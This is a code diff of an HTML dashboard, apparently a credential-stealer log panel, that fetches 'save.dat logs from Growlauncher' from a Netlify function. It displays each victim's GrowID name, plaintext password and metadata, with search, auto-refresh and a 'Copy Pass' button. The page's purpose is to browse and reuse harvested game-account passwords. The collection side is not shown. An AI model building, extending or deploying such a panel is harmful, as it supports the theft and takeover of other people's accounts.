@@ -3,45 +3,117 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DAT Monitor | NovaScript</title>
+    <title>DAT Logs | NovaScript</title>
     <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
     <style>
-        body { background: #0f172a; color: #f1f5f9; font-family: 'Inter', sans-serif; }
-        .glass { background: rgba(30, 41, 59, 0.7); backdrop-filter: blur(12px); border: 1px solid rgba(255,255,255,0.1); }
+        body { font-family: 'Inter', sans-serif; background-color: #0b0f1a; }
+        .nav-glass { background: rgba(17, 24, 39, 0.8); backdrop-filter: blur(10px); border-bottom: 1px solid rgba(255,255,255,0.05); }
+        .card-nova { background: #111827; border: 1px solid rgba(255,255,255,0.05); transition: all 0.3s ease; }
+        .card-nova:hover { border-color: #3b82f6; box-shadow: 0 0 20px rgba(59, 130, 246, 0.1); }
+        .status-pulse { animation: pulse 2s infinite; }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
     </style>
 </head>
-<body class="p-8">
-    <div class="max-w-6xl mx-auto">
-        <header class="flex justify-between items-center mb-10">
-            <h1 class="text-3xl font-bold bg-gradient-to-r from-blue-400 to-purple-500 bg-clip-text text-transparent">DAT Storage Monitor</h1>
-            <button onclick="fetchData()" class="bg-blue-600 hover:bg-blue-700 px-6 py-2 rounded-lg transition">Refresh Data</button>
-        </header>
+<body class="text-slate-200 min-h-screen">
+
+    <nav class="nav-glass sticky top-0 z-50 px-6 py-4">
+        <div class="max-w-7xl mx-auto flex justify-between items-center">
+            <div class="flex items-center space-x-2">
+                <div class="w-8 h-8 bg-blue-600 rounded-lg flex items-center justify-center font-bold">N</div>
+                <span class="text-xl font-bold tracking-tight text-white">Nova<span class="text-blue-500">Script</span></span>
+            </div>
+            <div class="flex items-center space-x-4">
+                <span id="connection-status" class="text-xs text-green-400 flex items-center">
+                    <span class="w-2 h-2 bg-green-500 rounded-full mr-2 status-pulse"></span> DB Connected
+                </span>
+            </div>
+        </div>
+    </nav>
+
+    <main class="max-w-7xl mx-auto px-6 py-10">
+        <div class="mb-10">
+            <h2 class="text-3xl font-bold text-white mb-2">DAT Monitor Dashboard</h2>
+            <p class="text-slate-400">Monitoring real-time save.dat logs from Growlauncher.</p>
+        </div>
+
+        <div class="flex flex-col md:flex-row gap-4 mb-8">
+            <input type="text" id="searchInput" placeholder="Search GrowID or Meta..." 
+                class="flex-1 bg-gray-900 border border-gray-800 rounded-lg px-4 py-3 focus:outline-none focus:border-blue-500 transition">
+            <button onclick="fetchData()" class="bg-blue-600 hover:bg-blue-700 text-white font-semibold px-8 py-3 rounded-lg transition">
+                Refresh Data
+            </button>
+        </div>
 
         <div id="logsContainer" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
-            </div>
-    </div>
+            <div class="animate-pulse bg-gray-900 h-48 rounded-xl"></div>
+            <div class="animate-pulse bg-gray-900 h-48 rounded-xl"></div>
+            <div class="animate-pulse bg-gray-900 h-48 rounded-xl"></div>
+        </div>
+    </main>
 
     <script>
+        // Sesuaikan dengan URL Netlify Function Anda
+        const API_URL = '/.netlify/functions/save-dat';
+
         async function fetchData() {
-            const res = await fetch('/.netlify/functions/save-dat');
-            const data = await res.json();
+            try {
+                const res = await fetch(API_URL);
+                const data = await res.json();
+                renderData(data);
+            } catch (err) {
+                console.error("Fetch error:", err);
+            }
+        }
+
+        function renderData(logs) {
             const container = document.getElementById('logsContainer');
-            container.innerHTML = data.map(log => `
-                <div class="glass p-6 rounded-xl shadow-2xl">
-                    <div class="flex justify-between mb-4">
-                        <span class="text-xs text-blue-400 font-mono">${log.timestamp}</span>
-                        <span class="bg-green-500/20 text-green-400 text-[10px] px-2 py-1 rounded">ACTIVE</span>
+            if (logs.length === 0) {
+                container.innerHTML = `<p class="col-span-full text-center text-slate-500 py-20">No data available yet.</p>`;
+                return;
+            }
+
+            container.innerHTML = logs.map(log => `
+                <div class="card-nova p-6 rounded-xl shadow-lg relative overflow-hidden">
+                    <div class="absolute top-0 right-0 p-3">
+                        <span class="text-[10px] font-bold text-blue-500 bg-blue-500/10 px-2 py-1 rounded">SECURE</span>
                     </div>
-                    <div class="space-y-2">
-                        <p class="text-sm"><span class="text-slate-400">GrowID:</span> <span class="font-mono text-white">${log.idName}</span></p>
-                        <p class="text-sm"><span class="text-slate-400">Pass:</span> <span class="font-mono text-purple-400">${log.idPass}</span></p>
-                        <p class="text-sm"><span class="text-slate-400">Meta:</span> <span class="font-mono text-blue-300">${log.meta}</span></p>
+                    <div class="mb-4">
+                        <div class="text-xs text-slate-500 uppercase tracking-widest font-semibold mb-1">GrowID Name</div>
+                        <div class="text-lg font-bold text-white font-mono">${log.tank_id_name}</div>
+                    </div>
+                    <div class="grid grid-cols-2 gap-4 mb-4">
+                        <div>
+                            <div class="text-[10px] text-slate-500 uppercase font-semibold">Password</div>
+                            <div class="text-sm font-mono text-blue-400 break-all">${log.tank_id_pass}</div>
+                        </div>
+                        <div>
+                            <div class="text-[10px] text-slate-500 uppercase font-semibold">Meta Info</div>
+                            <div class="text-sm font-mono text-slate-300">${log.meta_data}</div>
+                        </div>
+                    </div>
+                    <div class="pt-4 border-t border-gray-800 flex justify-between items-center">
+                        <span class="text-[10px] text-slate-600">${new Date(log.created_at).toLocaleString()}</span>
+                        <button class="text-xs text-blue-500 hover:underline">Copy Pass</button>
                     </div>
                 </div>
             `).join('');
         }
+
+        // Live Search
+        document.getElementById('searchInput').addEventListener('input', (e) => {
+            const term = e.target.value.toLowerCase();
+            const cards = document.querySelectorAll('.card-nova');
+            cards.forEach(card => {
+                const text = card.innerText.toLowerCase();
+                card.style.display = text.includes(term) ? 'block' : 'none';
+            });
+        });
+
+        // Initial Fetch
         fetchData();
-        setInterval(fetchData, 10000); // Auto refresh tiap 10 detik
+        // Auto-refresh every 30 seconds
+        setInterval(fetchData, 30000);
     </script>
 </body>
 </html>
